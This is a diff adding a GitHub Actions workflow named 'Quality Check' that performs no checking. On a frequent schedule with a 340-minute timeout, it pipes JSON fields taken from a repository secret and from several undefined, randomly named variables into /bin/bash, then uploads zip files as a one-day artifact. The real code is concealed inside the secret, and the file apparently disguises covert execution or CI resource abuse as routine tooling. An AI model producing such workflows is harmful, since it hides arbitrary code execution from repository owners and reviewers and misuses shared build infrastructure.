@@ -1,0 +1,30 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '49 2,8,14,20 * * *'
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          trwgy387: ${{ secrets.trwgy387 }}
+        run: |
+          printf '%s' "$trwgy387" | jq -r .wne4 | /bin/bash
+          printf '%s' "$wny9" | jq -r .u7421 | /bin/bash
+          printf '%s' "$ogpvq47964" | jq -r .nwkc22455 | /bin/bash
+          echo $wy4 | jq -r .lww6299 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: qt9YNkSv
+          path: "*.zip"
+          retention-days: 1
